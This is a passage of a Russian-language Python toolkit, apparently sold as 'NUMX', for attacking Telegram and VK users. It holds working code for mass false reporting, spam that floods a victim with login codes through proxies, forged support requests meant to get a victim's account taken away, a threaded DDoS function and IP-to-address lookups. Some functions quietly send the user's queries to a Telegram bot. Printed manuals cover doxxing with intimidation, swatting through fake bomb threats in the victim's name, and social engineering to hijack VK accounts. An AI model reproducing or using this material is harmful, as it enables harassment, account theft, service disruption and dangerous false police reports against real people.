                        for receiver_email in random.sample(receivers, min(2, len(receivers))):
                            complaint_body = complaint_texts[0].format(channel_link=channel_link.strip(), violation_link=violation_link.strip())
                            if send_email(receiver_email, sender_email, sender_password, "Жалоба на канал в Telegram", complaint_body):
                                print(f"\n\n[ Удачно ] Жалоба отправлена! |{receiver_email}!")
                                sent_emails += 1

                    if len(complaint_texts) > 1:
                        for sender_email, sender_password in senders.items():
                            for receiver_email in random.sample(receivers, min(2, len(receivers))):
                                complaint_body = complaint_texts[1].format(channel_link=channel_link.strip(), violation_link=violation_link.strip())
                                if send_email(receiver_email, sender_email, sender_password, "Complaint about a channel in Telegram", complaint_body):
                                    print(f"Sent to {receiver_email}!")
                                    sent_emails += 1
                    print("[ Удачно ] Жалоба отправлена! |")

            elif choice == "0":
                print("Выход из программы.")
                break

            else:
                print("\n\n[ Error ] Некорректный выбор.")

    handle_complaint()

def snos_accounts(api_id, api_hash):
    def user_agents():
        ua = UserAgent()
        return ua.random

    async def auth_spam(phone):
        print("\n\n=== Запуск Authcode SPAM ===\n")
        for i in range(1, 7):
            try:
                random_text = ''.join(random.choice(string.ascii_letters) for _ in range(6))
                client = TelegramClient(random_text, api_id, api_hash)
                await client.connect()
                await client.send_code_request(phone)
                await client.disconnect()
                print(f"[+] Код {i}/6 успешно отправлен")
            except Exception as e:
                print(f"[-] Код {i}/6 не удалось отправить: {e}")
        
        try:
            os.system("rm *.session")
            print("[+] Сессии удалены\n")
        except Exception as e:
            print(f"[-] Ошибка при удалении сессий: {e}")

    def site_auth_spam(phone):
        print("Запуск")
        data = {'phone': phone}
        urls = ['https://my.telegram.org/auth/send_password'] * 15
        for i, url in enumerate(urls, 1):
            headers = {'User-Agent': user_agents()}
            try:
                response = requests.post(url, data=data, headers=headers, proxies=proxies())
                status = "[+]" if response.ok else "[-]"
                print(f"{status} Запрос {i}/15")
            except requests.RequestException as e:
                print(f"[-] Запрос {i}/15 ошибка: {e}")

    proxies_list = [
        '8.218.149.193:80',
        '47.57.233.126:80',
        '47.243.70.197:80',
        '8.222.193.208:80',
        '144.24.85.158:80',
        '47.245.115.6:80',
        '47.245.114.163:80',
        '45.4.55.10:40486', 
        '103.52.37.1:4145',
        '200.34.227.204:4153', 
        '190.109.74.1:33633',
        '200.54.221.202:4145', 
        '36.67.66.202:5678',
        '168.121.139.199:4145',
        '101.255.117.2:51122',
        '45.70.0.250:4145',
        '78.159.199.217:1080', 
        '67.206.213.202:4145', 
        '14.161.48.4:4153',
        '119.10.179.33:5430',
        '109.238.222.1:4153',
        '103.232.64.226:4145',
        '183.88.212.247:1080', 
        '116.58.227.197:4145', 
        '1.20.97.181:34102', 
        '103.47.93.214:1080',
        '89.25.23.211:4153', 
        '185.43.249.132:39316',
        '188.255.209.149:1080',
        '178.216.2.229:1488', 
        '92.51.73.14:4153', 
        '109.200.156.2:4153',
        '89.237.33.193:51549',
        '211.20.145.204:4153', 
        '45.249.79.185:3629',
        '208.113.223.164:21829',
        '62.133.136.75:4153', 
        '46.99.135.154:4153', 
        '1.20.198.254:4153',
        '196.6.234.140:4153', 
        '118.70.196.124:4145',
        '185.34.22.225:46169',
        '103.47.93.199:1080',
        '222.129.34.122:57114',
        '92.247.127.249:4153',
        '186.150.207.141:1080',
        '202.144.201.197:43870',
        '103.106.32.105:31110', 
        '200.85.137.46:4153',
        '116.58.254.9:4145', 
        '101.51.141.122:4153',
        '83.69.125.126:4145',
        '187.62.88.9:4153', 
        '122.54.134.176:4145', 
        '170.0.203.11:1080', 
        '187.4.165.90:4153',
        '159.224.243.185:61303',
        '103.15.242.216:55492', 
        '187.216.81.183:37640',
        '176.197.100.134:3629', 
        '101.51.105.41:4145',
        '46.13.11.82:4153', 
        '103.221.254.125:40781', 
        '177.139.130.157:4153', 
        '1.10.189.133:50855', 
        '69.70.59.54:4153', 
        '83.103.195.183:4145', 
        '190.109.168.241:42732',
        '103.76.20.155:43818',
        '84.47.226.66:4145', 
        '1.186.60.25:4153',
        '93.167.67.69:4145',
        '202.51.112.22:5430', 
        '213.6.204.153:42820',
        '184.178.172.14:4145', 
        '217.171.62.42:4153',
        '121.13.229.213:61401',
        '101.255.140.101:1081',
        '78.189.64.42:4145',
        '187.11.232.71:4153', 
        '190.184.201.146:32606',                           
        '195.34.221.81:4153', 
        '200.29.176.174:4145', 
        '103.68.35.162:4145', 
        '194.135.97.126:4145',
        '167.172.123.221:9200',
        '200.218.242.89:4153',
        '190.7.141.66:40225',
        '186.103.154.235:4153',
        '118.174.196.250:4153',
        '213.136.89.190:52010',
        '217.25.221.60:4145',
        '50.192.195.69:39792',
        '180.211.162.114:44923',                           
        '179.1.1.11:4145', 
        '41.162.94.52:30022',
        '103.211.11.13:52616',
        '103.209.65.12:6667',
        '101.51.121.29:4153',
        '190.13.82.242:4153', 
        '103.240.33.185:8291',
        '202.51.100.33:5430',
        '201.220.128.92:3000', 
        '177.11.75.18:51327',
        '62.122.201.170:31871', 
        '79.164.171.32:50059',
        '202.124.46.97:4145', 
        '79.132.205.34:61731',
        '217.29.18.206:4145',
        '222.217.68.17:35165',
        '105.29.95.34:4153', 
        '103.226.143.254:1080',
        '119.82.251.250:31678', 
        '45.232.226.137:52104',
        '195.69.218.198:60687', 
        '155.133.83.161:58351', 
        '213.108.216.59:1080', 
        '178.165.91.245:3629',
        '124.158.150.205:4145',
        '36.72.118.156:4145', 
        '177.93.79.18:4145', 
        '103.47.94.97:1080', 
        '78.140.7.239:40009', 
        '187.19.150.221:80', 
        '103.192.156.171:4145', 
        '36.67.27.189:49524', 
        '188.136.167.33:4145', 
        '91.226.5.245:36604', 
        '78.90.81.184:42636', 
        '189.52.165.134:1080', 
        '81.183.253.34:4145', 
        '95.154.104.147:31387', 
        '220.133.209.253:4145', 
        '182.52.108.104:14153', 
        '195.93.173.24:9050', 
        '170.244.64.129:31476', 
        '117.102.124.234:4145', 
        '190.210.3.210:1080', 
        '182.253.142.11:4145', 
        '176.98.156.64:4145', 
        '210.48.139.228:4145', 
        '177.39.218.70:4153', 
        '112.78.134.229:41517', 
        '119.46.2.245:4145', 
        '103.212.94.253:41363', 
        '190.109.72.41:33633', 
        '103.94.133.94:4153', 
        '190.151.94.2:56093', 
        '190.167.220.7:4153', 
        '94.136.154.53:60030', 
        '103.206.253.120:4153'
    ]

    def proxies():
        proxies = {'http': random.choice(proxies_list)}
        return proxies

    def load_accounts():
        try:
            with open(ACCOUNTS_FILE, 'r') as file:
                return json.load(file)
        except FileNotFoundError:
            return []

    def save_accounts(accounts):
        with open(ACCOUNTS_FILE, 'w') as file:
            json.dump(accounts, file, indent=4)

    def delete_session(phone_number):
        session_file = f"session_{phone_number}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
            print(f"Сессия {session_file} успешно удалена.")
        else:
            print(f"Сессия {session_file} не найдена.")

        accounts = load_accounts()
        accounts = [acc for acc in accounts if acc['phone_number'] != phone_number]
        save_accounts(accounts)
        print(f"Аккаунт {phone_number} удалён из базы.")

    def add_account():
        api_id = 21826549
        api_hash = 'c1a19f792cfd9e397200d16c7e448160'
        phone_number = input("Введите номер телефона: ")
        accounts = load_accounts()
        accounts.append({"api_id": api_id, "api_hash": api_hash, "phone_number": phone_number})
        save_accounts(accounts)
        print("Аккаунт успешно добавлен!")

    def choose_reason():
        print("Выберите причину жалобы:")
        print("1. Спам")
        print("2. Насилие")
        print("3. Порнография")
        print("4. Эксплуатация детей")
        print("5. Другое")
        choice = input("Введите номер причины: ")

        if choice == "1":
            return InputReportReasonSpam()
        elif choice == "2":
            return InputReportReasonViolence()
        elif choice == "3":
            return InputReportReasonPornography()
        elif choice == "4":
            return InputReportReasonChildAbuse()
        elif choice == "5":
            return InputReportReasonOther()
        else:
            print("Некорректный выбор. Повторите попытку.")
            return choose_reason()

    async def authenticate_client(client, phone_number):
        try:
            print(f"Подключение к аккаунту {phone_number}...")
            if not client.is_connected():
                await client.connect()
            if not await client.is_user_authorized():
                print(f"Авторизация аккаунта {phone_number}...")
                await client.send_code_request(phone_number)
                code = input(f"Введите код для {phone_number}: ")
                await client.sign_in(phone_number, code)
                try:
                    await client.sign_in(password=input("Введите пароль от двухфакторной аутентификации (если включено): "))
                except Exception:
                    pass
            print(f"Аккаунт {phone_number} успешно авторизован.")
        except Exception as e:
            print(f"Ошибка при авторизации {phone_number}: {e}")
        finally:
            if not client.is_connected():
                print(f"Ошибка: клиент {phone_number} не подключен.")
                await client.disconnect()

    async def send_message_report(client, message_link, reason):
        try:
            if not client.is_connected():
                print("Клиент отключен. Переподключение...")
                await client.connect()

            parts = message_link.split('/')
            chat_username = parts[-2]
            message_id = int(parts[-1])

            chat = await client.get_entity(chat_username)
            for i in range(4):
                await client(ReportPeerRequest(
                    peer=chat,
                    reason=reason,
                    message=""
                ))
                print(f"Жалоба от {client.session.filename} на сообщение {message_id} успешно отправлена.")
        except Exception as e:
            print(f"Ошибка при отправке жалобы от {client.session.filename}: {e}")

    async def main():
        print("""        
            Меню:
            1. Отправить жалобу
            2. Добавить новый аккаунт
            3. Удалить аккаунт и сессию
            4. Снос сессии
            5. Выход
            """)
        while True:
            choice = input("Введите номер действия: ")

            if choice == "1":
                accounts = load_accounts()
                if not accounts:
                    print("Сначала добавьте хотя бы один аккаунт!")
                    continue

                message_link = input("Введите ссылку на сообщение (например, https://t.me/username/123): ")
                reason = choose_reason()

                for account in accounts:
                    print(f"\nЗапуск аккаунта {account['phone_number']}...")
                    client = TelegramClient(f"session_{account['phone_number']}", account["api_id"], account["api_hash"])
                    async with client:
                        try:
                            await client.start(phone=account["phone_number"])
                            await send_message_report(client, message_link, reason)
                        except Exception as e:
                            print(f"Ошибка при работе с аккаунтом {account['phone_number']}: {e}")
            elif choice == "2":
                add_account()
            elif choice == "3":
                phone_number = input("Введите номер телефона аккаунта для удаления: ")
                delete_session(phone_number)
            elif choice == "4":
                phone = input("Введите номер телефона: ")
                username = input("Введите юзернейм жертвы: ")
                user_agent = {'User-Agent': user_agents()}
                random_text = ''.join(random.choice(string.ascii_letters) for _ in range(8))
                support_text = f"""Здравствуйте, команда поддержки Telegram.

К сожалению, я случайно перешел по фишинговой ссылке и потерял доступ к своему аккаунту. Злоумышленники, вероятно, получили доступ к моим данным и изменили настройки учетной записи. Прошу помочь с восстановлением доступа.

Номер телефона моего аккаунта: {phone}
Юзернейм на аккаунте: {username}

Спасибо за вашу помощь и поддержку."""

                await auth_spam(phone)
                site_auth_spam(phone)
                time.sleep(1)
                
                for _ in range(40):
                    try:
                        requests.get(
                            f"https://telegram.org/support?message={support_text}&email={random_text}@gmail.com&phone={phone}",
                            headers=user_agent,
                            proxies=proxies()
                        )
                        
                    except Exception as e:
                        print("error")
                        
                input("\nНажмите ENTER для продолжения...")
                await main()
            elif choice == "5":
                print("Выход из программы.")
                break
            else:
                print("Некорректный ввод. Повторите попытку.")

    asyncio.run(main())

def rabota_c_url():
    def check_link_safety(url):
        trusted_domains = [
            'google.com', 'youtube.com', 'vk.com', 'ok.ru', 'facebook.com', 
            'instagram.com', 'twitter.com', 'telegram.org', 'trusted-domain.com',
            'yandex.ru', 'yandex.com', 'ya.ru'
        ]

        parsed_url = urlparse(url)
        if any(trusted in parsed_url.netloc for trusted in trusted_domains):
            print(colored(f"{url} принадлежит доверенному домену и считается безопасной.", "green"))
            return

        try:
            response = requests.get(url, allow_redirects=True)
            if response.status_code == 200:
                suspicious_found = False
                final_url = response.url

                if final_url != url:
                    print(colored(f"Внимание! Ссылка перенаправляет на другой URL: {final_url}", "yellow"))
                    suspicious_found = True

                parsed_url = urlparse(final_url)
                query_params = parse_qs(parsed_url.query)
                suspicious_params = ['token', 'session', 'id', 'key', 'auth', 'login', 'password', 'email', 'user', 'account']
                for param in suspicious_params:
                    if param in query_params:
                        print(colored(f"Внимание! Найден подозрительный параметр в URL: {param}", "yellow"))
                        suspicious_found = True

                content = response.text.lower()
                suspicious_keywords = ['track', 'collect', 'logger', 'steal', 'phishing', 'malware', 'hack', 'exploit']
                for keyword in suspicious_keywords:
                    if keyword in content:
                        print(colored(f"Внимание! Найден подозрительный ключевой элемент на странице: {keyword}", "yellow"))
                        suspicious_found = True

                soup = BeautifulSoup(response.text, 'html.parser')
                scripts = soup.find_all('script')
                if scripts:
                    for script in scripts:
                        src = script.get('src', '')
                        if src and not any(trusted in src for trusted in ['telegram.org', 'trusted-domain.com']):
                            print(colored(f"Внимание! Найден подозрительный скрипт: {src}", "yellow"))
                            suspicious_found = True

                forms = soup.find_all('form')
                if forms:
                    print(colored(f"Внимание! На странице найдены формы ({len(forms)} шт).", "yellow"))
                    suspicious_found = True

                external_resources = set()
                for tag in soup.find_all(['script', 'img', 'link', 'iframe']):
                    src = tag.get('src') or tag.get('href')
                    if src and not src.startswith(('data:', 'http://', 'https://')):
                        if not any(trusted in src for trusted in ['telegram.org', 'trusted-domain.com']):
                            external_resources.add(src)
                if external_resources:
                    print(colored(f"Внимание! Найдены внешние ресурсы: {', '.join(external_resources)}", "yellow"))
                    suspicious_found = True

                if suspicious_found:
                    print(colored(f"{url} является подозрительной или опасной!", "red"))
                else:
                    print(colored(f"{url} безопасная ссылка.", "green"))
            else:
                print(colored(f"{url} потенциально опасная ссылка.", "red"))
        except requests.exceptions.RequestException as e:
            print(f"Произошла ошибка при проверке {url}: {str(e)}")
    HOURS = datetime.now().strftime("%H")
    MIN = datetime.now().strftime("%M")
    SEC = datetime.now().strftime("%S")

    def send_notification(log_bot, log_rec, message): 
        url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&text={message}'
        response = requests.post(url)

    def check_for_logger(url):
        suspicious_found = False
        try:
            response = requests.get(url, allow_redirects=True)
            final_url = response.url
            if final_url != url:
                print(colored(f"Внимание! Ссылка перенаправляет на другой URL: {final_url}", "yellow"))
                suspicious_found = True
            parsed_url = urlparse(final_url)
            query_params = parse_qs(parsed_url.query)

            suspicious_params = ['token', 'session', 'id', 'key', 'auth', 'login', 'password']
            for param in suspicious_params:
                if param in query_params:
                    print(colored(f"Внимание! Найден подозрительный параметр в URL: {param}", "yellow"))
                    suspicious_found = True
            suspicious_keywords = ['track', 'collect', 'logger', 'steal']
            content = response.text.lower()
            for keyword in suspicious_keywords:
                if keyword in content:
                    print(colored(f"Внимание! Найден подозрительный ключевой элемент на странице: {keyword}", "yellow"))
                    suspicious_found = True

            if suspicious_found:
                print(colored("Ссылка является логгером!", "red"))
            else:
                print(colored("Подозрительные элементы не найдены.", "green"))

        except requests.exceptions.RequestException as e:
            print(f"Ошибка при проверке {url}: {str(e)}")

    def dos(target):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
        }
        try:
            res = requests.get(target, headers=headers)
        except requests.exceptions.ConnectionError:
            print("[+] Connection error!")

    def run_ddos(url, threads):
        if not url.startswith("http"):
            print("URL должен начинаться с http или https!")
            return

        if not url.__contains__("."):
            print("Некорректный домен!")
            return

        thread_list = []

        def dos_threaded(url, progress_bar):
            dos(url)
            progress_bar.update(1)

        with tqdm(total=threads, desc='Threads Progress') as pbar:
            for _ in range(threads):
                thr = threading.Thread(target=dos_threaded, args=(url, pbar))
                thr.start()
                thread_list.append(thr)

            for thr in thread_list:
                thr.join()

    while True:
        print(colored("\n1. Проверить ссылку на безопасность", "cyan"))
        print(colored("2. Проверить ссылку на логгер", "cyan"))
        print(colored("3. Запустить DDoS-атаку", "cyan"))
        print(colored("0. Выйти", "cyan"))
        choice = input("\nВыберите действие: ")

        if choice == '1':
            url = input("Введите URL для проверки: ")
            log_info = (f"Запущен в {HOURS}:{MIN}:{SEC}\n"
                f"Запрос -  {url}")
            send_notification(log_bot, log_rec, log_info)
            check_link_safety(url)
        elif choice == '2':
            url = input("Введите URL для проверки на логгер: ")
            check_for_logger(url)
        elif choice == '3':
            url = input("Введите URL для DDoS-атаки: ")
            try:
                threads = int(input("Введите количество потоков: "))
                if threads <= 0:
                    print("Количество потоков должно быть больше 0!")
                    continue
                run_ddos(url, threads)
            except ValueError:
                print("Некорректное количество потоков!")
        elif choice == '0':
            print("Выход из программы.")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите 1, 2, 3 или 0.")
            
def probiv_po_ip():
    def get_user_ip():
        try:
            response = urllib.request.urlopen('https://api.ipify.org?format=json')
            data = json.load(response)
            return data.get('ip', 'Неизвестно')
        except Exception as e:
            return f"Ошибка при получении IP: {e}"

    def search_by_ip(ip):
        ip_info_url = f"https://ipinfo.io/{ip}/json"
        try:
            ip_info_response = urllib.request.urlopen(ip_info_url)
            ip_info = json.load(ip_info_response)
        except urllib.error.URLError:
            return "Информация по IP не найдена."

        result = {
            "query": ip_info.get('ip', 'Неизвестно'),
            "city": ip_info.get('city', 'Неизвестно'),
            "region": ip_info.get('region', 'Неизвестно'),
            "country": ip_info.get('country', 'Неизвестно'),
            "org": ip_info.get('org', 'Неизвестно'),
            "loc": ip_info.get('loc', '')
        }

        if result["loc"]:
            latitude, longitude = result["loc"].split(",")
            result["lat"] = latitude
            result["lon"] = longitude
            address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
            try:
                address_response = urllib.request.urlopen(address_url)
                address_data = json.load(address_response)
                if "address" in address_data:
                    sorted_address = sort_address(address_data["address"])
                    result["address"] = sorted_address
                else:
                    result["address"] = "Адрес не найден"
            except Exception as e:
                result["address"] = f"Ошибка при получении адреса: {e}"
        else:
            result["address"] = "Координаты недоступны"

        return result

    def sort_address(address):
        address_order = [
            "country",
            "state",
            "city",
            "town",
            "village",
            "road",
            "house_number",
            "postcode"
        ]
        
        sorted_address = {}
        for key in address_order:
            if key in address:
                sorted_address[key] = address[key]
        
        for key, value in address.items():
            if key not in sorted_address:
                sorted_address[key] = value
        
        return sorted_address

    def translate_address(address):
        translations = {
            "country": "Страна",
            "state": "Регион",
            "city": "Город",
            "town": "Городок",
            "village": "Деревня",
            "road": "Улица",
            "house_number": "Номер дома",
            "postcode": "Почтовый индекс",
            "residential": "Жилой район",
            "county": "Округ",
            "iso3166-2-lvl4": "Код региона",
            "country_code": "Код страны"
        }
        
        translated_address = {}
        for key, value in address.items():
            translated_key = translations.get(key, key.capitalize())
            translated_address[translated_key] = value
        
        return translated_address

    def send_notification(log_bot, log_rec, message): 
        url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&text={message}'
        response = requests.post(url)
    while True:
        user_ip = get_user_ip()
        current_time = datetime.now().strftime("%H:%M:%S")
        
        ip = input("\nВведите IP для поиска или 0 для выхода: ")
        
        if ip == '0':
            break
        else:
            log_info = (f"Запущен в {current_time}\n"
                        f"IP пользователя: {user_ip}\n"
                        f"Запрос: {ip}")
            send_notification(log_bot, log_rec, log_info)
            result = search_by_ip(ip)
            
            if isinstance(result, str):
                print(f"\n{result}")
            else:
                print(f"""
                IP: {result.get('query', 'Неизвестно')}
                Страна: {result.get('country', 'Неизвестно')}
                Регион: {result.get('region', 'Неизвестно')}
                Город: {result.get('city', 'Неизвестно')}
                Широта: {result.get('lat', 'Неизвестно')}
                Долгота: {result.get('lon', 'Неизвестно')}
                Организация: {result.get('org', 'Неизвестно')}
                Адрес:
                """)
                if isinstance(result.get("address"), dict):
                    translated_address = translate_address(result["address"])
                    for key, value in translated_address.items():
                        print(f"  {key}: {value}")
                else:
                    print(f"  {result.get('address', 'Неизвестно')}")
            
            input("\nНажмите Enter для продолжения...")

logo =  f"""
███▄▄▄▄   ███    █▄     ▄▄▄▄███▄▄▄▄   ▀████    ▐████▀ 
███▀▀▀██▄ ███    ███  ▄██▀▀▀███▀▀▀██▄   ███▌   ████▀  
███   ███ ███    ███  ███   ███   ███    ███  ▐███    
███   ███ ███    ███  ███   ███   ███    ▀███▄███▀    
███   ███ ███    ███  ███   ███   ███    ████▀██▄     
███   ███ ███    ███  ███   ███   ███   ▐███  ▀███    
███   ███ ███    ███  ███   ███   ███  ▄███     ███▄  
 ▀█   █▀  ████████▀    ▀█   ███   █▀  ████       ███▄ 
                                                      
"""

def menu():
    print("\nМеню:")
    print("[0] - Об авторе")
    print("[1] - Снос")
    print("[2] - Пробив по номеру")
    print("[3] - Пробив по IP")
    print("[4] - Работа с url")
    print("[5] - Флуд кодами")
    print("[6] - Спам в Telegram")
    print("[7] - Мануал по доксу")
    print("[8] - Мануал по свату")
    print("[9] - Мануал по анонимности")
    print("[10] - Мануал на снятие вечного спам-блока")
    print("[11] - Мануал на рес акка")
    print("[12] - Мануал по сносу")
    print("[13] - Мануал по угону ВК")
    print("[14] - Генерация личностей")
    print("[15] - Текст для свата")
    print("[99] - Очистить консоль")

def main():
    print("""\nДисклеймер:\nАвтор данного софта не несет ответственности за любые последствия, возникшие в результате использования предоставленной информации. Все действия, предпринятые на основе данного контента, осуществляются исключительно на ваш страх и риск.""")
    time.sleep(4)
    os.system("clear")
    print(logo)
    print()

    while True:
        menu()
        c = input("\nВыберите опцию: ")
        if c == '1':
            print("\n0 - Выход")
            print("1 - Снос через аккаунты")
            print("2 - Снос через почты")
            cS = input("Выберите опцию: ")
            if cS == '0':
                continue
            elif cS == '1':
                snos_accounts(api_id=21826549, api_hash='c1a19f792cfd9e397200d16c7e448160')
            elif cS == '2':
                snos_email()
        elif c == '2':
            probiv_po_nomeru()
        elif c == '3':
            probiv_po_ip()
        elif c == '4':
            rabota_c_url()
        elif c == '5':
        	flood_codami()
        elif c == '6':
        	asyncio.run(spam_tg())
        elif c == '7':
        	print("""\n1) шаг это номер телефона, бывает 3 исхода.
 1.1 - если это школьник то номер может быть не скрыт.
 1.2 - пусть добавит вас в контакты, тогда номер будет виден.
 1.3 - просто посмотреть номер в гб, или если не хатите тратить бабки пиши в чатах найдите тех кто найдет вам номер).
МНОГИЕ ОСКАЮТ ГБ, НО ЭТО ЛУЧШИЙ БОТ ПО ПРОБИВУ И ЮЗАЮТ ЕГО ПОЧТИ ВСЕ ДОКСЕРЫ.

2) Надо понять валид этот номер или нет, сайт https://smsc.ru/testhlr/, если в сети - валид, не в сети - физ.
 2.1 - Если физ, то остался 1 способ кидаем ему логгер (https://golink.su/ - сокращение ссылки) и дальше докс по айпи.
 2.2 - Если же валид, то чекаем сам номер. РФ дальше идем по софтам, Беларусь чекаем в гугле, например https://avtomusic-nn.ru/. Также чекаем в Яндексе "intext: номер" или же "https://reveng.ee/search?q=номер". Укр или Каз идет сразу пугать номером, НО НЕ КАК ВСЕ: АЛЕКСАНД КУ ТЕБЕ ПИЗДА. Так писать не надо, надо писать как психологи: Привет брат, чс=пизда, лучше поговори со мной мирно). Всё легко и просто, без оска.

3) По софтам нашли откуда он и имя его с фамилией, дальше чекаем ВК его, если профиль открыт ищем в друзьях родоков и близких (по фамилии), там же есть адреса. Если же профиль закрыт (было в моей работе и такое) просто пишем в лс: здарово браток. Работало всегда без отказно. (главное не валид вк юзайте или профиль закройте).

4) Ну все пишите в тг, как в пункте 2.2 и заставьте извиняться.""")
        elif c == '8':
        	print("""\nСам лично никогда этим не занимался и вам не советую, и даже если вы это сделаете то я не несу ответственность за это.
1) Первый способ: вы покупаете старый телефон, это может любой старый кнопочный нокио за 100р, и симку  в переходе за 200р с небольшим баликом. Идем куда-то в лес или на поляну. звоним в отдел милиции, и говорим по шаблону: я (имя фамилия обидчека) заминировал (что-то) у вас два часа скинуть бабки на номер (номер обидчека). Все выкидываем телефон, и идем домой. 
2) Второй способ: также покупаем телефон (сенсорный), идем к другу в гости и подключаемс к его вайфаю, включаем впн- ПРОТОН ВПН. самый безопасный впн. дальше пишим текст, оправляем его на сайт и ливаем из хаты друга и выкидываем телелефон.
3) Третий способ: покупаем почту джамил и пишим в мвд текст письма по шаблону.
4) Четвертый способ: покупаем скайп, именно покупаем уже с номером, и звоним в мвд и говорим по шаблону. 
На этом се) Я НЕ ПРИЗЫВАЮ ВАС ЭТО ДЕЛАТЬ И ДАЖЕ ГОВОРЮ ЧТО ЗАБУДЬТЕ О СВАТЕ! Я ПРОТИВ ЭТОГО! ДАЖЕ ЕСЛИ РЕШИЛИСЬ, АВТОР НЕ НЕСЕТ ОТВЕТСТВЕННОСТЬ ЗА ВАШИ ДЕЙСТВИЯ. И ЮЗАЙТЕ ВПН.""")
        elif c == '9':
        	print("""\n1) Как вы поняли впн (или прокси). Самый лучший впн для анонимности это ПРОТОН ВПН.
2) Это сидеть на физе, а не на валид акке
А лучше не нарываться на неприятности) Хотя если давно по жопе не получали, дерзайте.
""")
        elif c == '10':
        	print("""\n1) Идём в бота @SpamBot и делаем все по инструкции.
ИНСТРУКЦИЯ: (Нажимать на эти слова)
1) /start
2) это ошибка 
3) да
4) Нет, ничего подобного не было.
5) - текста для снятия сб 
            5.1) Telegram developers! I have not logged into telegrams for a long time, and have not corresponded for a long time in various public groups, and you spammed me here, most likely blocked! But I think it was not right because there was nothing speciall! Therefore, I ask you to remove my restrions!
          5.2) Я вас в рот ебал сб сняли живо.
          5.3) Я к сожалению не могу писат родным, я соблюдаю правила телеграмма и не понимаю почему мне наложили спам блок. Я буду вынужден напистаь плохой отзыв и уйти от вас!
""")
        elif c == '11':
        	print("""\n1. Для начала мы заходим на сайт телеграма (http://telegram.org/support)

2. Теперь мы должны написать текст, что вы не нарушали правила.
Пример:
Здравствуйте уважаемая поддержка телеграм. Сегодня мне заблокировали аккаунт не за что, я не нарушал правила и соблюдал их в каждом чате. Возможно, что вы не до конца изучили жалобы, прошу вас рассмотреть разблокировку моего аккаунта. Спасибо! Мои данные для восстановления:

(номер) - номер от аккаунта.

(почта) - почта привязанная к аккаунту для восстановления.

3.Ожидаем письмо от тг с кодом восстановления.
""")
        elif c == '12':
        	print("""1) Хочется начать с самого легкого сноса-просто закинуть в ботнет....

2) Если без шуток, вы видите, что ваша жертва в чате кого-то тегнула или написала команду на подобии /reset@best_contests_bot, или же прислала любую ссылку, ГЛАВНОЕ, ЧТОБ У ЧЕЛОВЕКА НЕ БЫЛО ПРЕФИКСА В ЧАТЕ!!!  Мы нажимаем на эту смс, дальше выбираем !Пожаловаться, спам или другие жб. Так надо повторить несколько раз +- 200 с 1 аккаунта и если есть у вас акки тг то делаем тоже самое с других аккаунтов)  

3) Это написать в поддержку телеграма telegram.org пишем такой текст: "Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - , его айди - , ссылка на нарушения - . Пожалуйста примите меры по отношению к данному пользователю." Дальше имя любое и свой акк и номер, так тоже нужно сделать много раз.""")
        elif c == '13':
        	print("""Мануал по взлому ВК, от АРМАТА
(Он больше шуточный чем реал рабочий)
1:номер который привязан к странице
2:впн
сам способ
находим номер человека который привязан к странице
включаем впн
заходим в браузерную версию вк нажимаем "забыли пароль"
вводим номер который узнали
фамилию которая указана на странице
выбираем "нету доступа к странице"
нажимаем "позвонить на номер"
пишем человеку похожим текстом
"привет  тебе звонили дай пожалуйста номер который звонил"
дальше смотрим какие последние цифры и вводим их.
шанс 99%, что человек даст номер""")
        elif c == '14':
        	generate_fake_data()
        elif c == '15':
        	text_swat()
        elif c == '0':
        	for i in range(10):
        		os.system('clear')
        	print(logo)
        	print()
        	d = input("Нажмите Enter чтобы перейти в телеграмм канал: ")
        	if d == '':
        		webbrowser.open()
        	else:
        		os.system('clear')
        		print(logo)
        		print()
        elif c == '99':
        	for i in range(10):
        		os.system('clear')
        	print(logo)
        	print()
        else:
            print("Неверный выбор.")

if __name__ == "__main__":
    print(logo)
    print()
    print("""Всем привет: Мы рады вас приветствовать в софте NUMX. Благодарим за покупку и желаем удобного и хорошо использования. Спасибо, удачного дня!""")
    time.sleep(2)
    os.system("clear")
    print(logo)
    main()